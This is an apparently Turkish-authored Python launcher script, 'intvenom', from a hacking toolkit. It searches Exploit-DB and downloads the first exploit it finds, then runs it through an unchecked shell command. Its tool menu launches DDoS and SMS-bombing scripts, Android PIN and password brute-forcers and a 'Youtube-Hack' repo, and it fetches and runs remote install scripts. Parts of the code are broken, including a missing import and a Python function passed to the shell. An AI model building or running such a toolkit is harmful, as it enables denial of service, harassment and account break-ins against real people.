import argparse
import os
import requests
from bs4 import BeautifulSoup
import subprocess
import shutil
import re
from colorama import Fore, init

parser = argparse.ArgumentParser(description="intvenom")

parser.add_argument("start", nargs='?', help="intconsole Starter")
parser.add_argument("use", nargs='?', help="Exploit using command")
parser.add_argument("add", nargs='?', help="add a code")

parser.add_argument("-p", "--payload", required=False, help="search exploit payload's")
parser.add_argument("-t", "--tools", required=False, help="Installing Tools")
parser.add_argument('-v', '--version', required=False, action='store_true', help="see version")

args = parser.parse_args()

# Payload araştırma ve indirme fonksiyonu
def search_and_download_payload(payload):
    try:
        # Exploit-DB'de arama yap
        search_url = f"https://www.exploit-db.com/search?q={payload}"
        response = requests.get(search_url)
        
        if response.status_code == 200:
            soup = BeautifulSoup(response.content, 'html.parser')
            exploit_link = soup.select_one('.exploitdb_results tbody tr:nth-child(1) td:nth-child(2) a')
            
            if exploit_link:
                exploit_name = exploit_link.text.strip()
                exploit_url = exploit_link['href']
                print(f"\n[+] Bulunan exploit: {exploit_name}")
                
                # Exploit'i indir
                download_url = f"https://www.exploit-db.com{exploit_url}"
                response = requests.get(download_url)
                
                if response.status_code == 200:
                    # Dosyayı geçici bir klasöre kaydet
                    exploit_file_name = f"{exploit_name}.txt"
                    temp_folder = "temp_exploits"
                    if not os.path.exists(temp_folder):
                        os.makedirs(temp_folder)
                    
                    temp_file_path = os.path.join(temp_folder, exploit_file_name)
                    
                    with open(temp_file_path, 'wb') as file:
                        file.write(response.content)
                    
                    print(f"[+] {exploit_name} başarıyla indirildi: {temp_file_path}")
                    
                    # Exploit dosyasının içeriğinde zararlı kod kontrolü yap
                    if check_malicious_code(temp_file_path):
                        print("[!] Exploit dosyasında zararlı kod algılandı. İşlem durduruldu.")
                        return temp_file_path, False
                    
                    return temp_file_path, True
                else:
                    print("[!] Exploit indirilirken bir hata oluştu.")
                    return None, False
            else:
                print("[!] Aranan payload Exploit-DB'de bulunamadı.")
                return None, False
        else:
            print("[!] Exploit-DB'ye bağlanırken bir hata oluştu.")
            return None, False
    except Exception as e:
        print(f"[!] Bir hata oluştu: {str(e)}")
        return None, False

# Exploit dosyasında zararlı kod kontrolü yapan fonksiyon
def check_malicious_code(file_path):
    try:
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
            content = file.read()
            # Örnek bir zararlı kod deseni ekleme
            if re.search(r'eval\(base64_decode\(', content):
                return True
            # Başka zararlı kod desenleri ekleyebilirsiniz
        return False
    except Exception as e:
        print(f"[!] Zararlı kod kontrolünde bir hata oluştu: {str(e)}")
        return True

# Komutu çalıştıran fonksiyon
def execute_command(command):
    try:
        # Komutu terminalde çalıştır
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Komut çalıştırılırken bir hata oluştu: {str(e)}")

if args.start:
    os.system("intconsole") or os.system("python3 intconsoleV2.py")

def get_version():
    url = "https://raw.githubusercontent.com/Intikam21kurucu/intframework/Intikam21kurucu-patch-1/version.md"
    response = requests.get(url)
    if response.status_code == 200:
        return response.text
    else:
        return "Failed to fetch version information."

if args.version:
    print(get_version())
def lr():
		time.sleep(1)
		print("termux [y] kali [n]")
		k = input("Do you using [termux/kali] ?")
		if k == "y" or "Y" or "termux" or "Termux" or "TERMUX":
			os.system("pkg update -y && pkg upgrade -y && apt update -y && apt upgrade -y")
			os.system("pkg install wget -y")
			os.system("wget https://github.com/gushmazuko/metasploit_in_termux/raw/master/metasploit.sh")
			os.system("chmod +x metasploit.sh")
			os.system("./metasploit.sh")
		elif k == "n" or "N" or "kali" or "Kali" or "KALİ":
			os.system("sudo apt-get install metasploit-framework")
			os.system("msfconsole")

# Tool çalıştırma fonksiyonu
def run_tool(tool_number):
    tools = {
        "1": "python3 DDOS.py",
        "2": "python3 SMSBOMBER.py",
        "3": "python3 DISCORD.py",
        "5": """
        git clone https://github.com/Intikam21kurucu/Intikam21
        cd Intikam21
        python3 Intikam21.py""",
        "4": "lr()",
        "6": "python3 iptracker.py",
        "7": """
        git clone https://github.com/in4osecurity/Youtube-Hack
        cd Youtube-Hack
        bash kurulum.sh""",
        "8": "python3 sendemail.py",
        "9": "python3 OSINT.py",
        "10": """
        git clone https://github.com/urbanadventurer/Android-PIN-Bruteforce
        cd Android-PIN-Bruteforce
        ./android-pin-bruteforce crack --length 6
        """,
        "11": """
        git clone https://github.com/Antu7/python-bruteForce
        cd python-bruteForce
        pip install requests
        python3 bruteforce.py
        """,
        "12": {
            "termux": """
            cd ~
            rm -rf intframework
            git clone https://github.com/Intikam21kurucu/intframework
            cd intframework
            chmod +x terbuild.sh
            ./terbuild.sh
            """,
            "kali": """
            cd ~
            rm -rf intframework
            git clone https://github.com/Intikam21kurucu/intframework
            cd intframework
            chmod +x start_kali.sh
            ./start_kali.sh
            """
        },
        "13": "python3 +90wifitools.py"
    }
    command = tools.get(tool_number)
    if command:
        print(f"[+] Tool {tool_number} çalıştırılıyor: {command}")
        execute_command(command)
    else:
        print(f"[!] Tool {tool_number} bulunamadı.")
def runpy():
    init(autoreset=True)
    print(Fore.BLUE + "")
    print("[+] Payload araştırma ve kullanma işlemi başlatılıyor...\n")
    
if args.payload:
   runpy()
   payload_path, is_safe = search_and_download_payload(args.payload)
   if payload_path and is_safe and args.use:
        # Use komutunu çalıştır
        use_command = f"{args.use} {payload_path}"
        print(f"[+] Use komutu çalıştırılıyor: {use_command}")
        execute_command(use_command)
    
if args.add:
	print(f"[+] Add komutu çalıştırılıyor: {args.add}")
	# Add işlemini burada tanımlayabilirsiniz

if args.tools:
    	# Tools kurulum işlemi burada yapılacak
    	run_tool(args.tools)

# Ana işlem
if __name__ == "__main__":
    print("""
   ⠀⠀⢀⠤⠒⠒⠀⠒⠂⢄⡀⠀⠀⠀⠀⠀⠀
⠀⡜⢀⠀⠀⠀⠀⠀⠀⢀⡈⢆⠀⠀⠀⠀⠀
⠸⠀⠃⡄⠀⠀⠀⠀⠀⡸⢱⠀_ _ _ ___ _ _ ____ _ _ ____ _ _
⡇⢸⠀⠀⠄⠀⠀⠀⠜⠀⠀⠂⠄| |\ | | | | |___ |\ | | | |\/|⠀⠀⠀
⠇⢨⠀⠀⠈⢚⠸⠂⠀⠀⠀⡄⡄| | \| | \/ |___ | \| |__| |⠀⠀⠀⠀
⠐⢆⢂⠀⠀⠈⠀⠢⢀⣀⢎⡄⠀⠀⠀⡀⠀
⠰⡘⣷⢶⣿⣾⣧⣿⣶⠶⡻⣠⠃⠀⠀⠘⡄
⠀⠑⣿⣄⣿⠾⠷⡟⠥⡴⠡⠃⠀⠀⢀⠔⡀
⠀⠀⠘⢟⣷⣠⣄⡀⠀⠈⢇⠠⠂⠉⡠⠄⠀
⠀⠀⠀⠘⠻⣿⠶⡟⣄⡀⠀⠀⢀⠎⠀⠀⠀
⠀⠀⠀⠀⠑⠤⠠⠤⠃⠀⠉⠉⠀⠀
    """)
    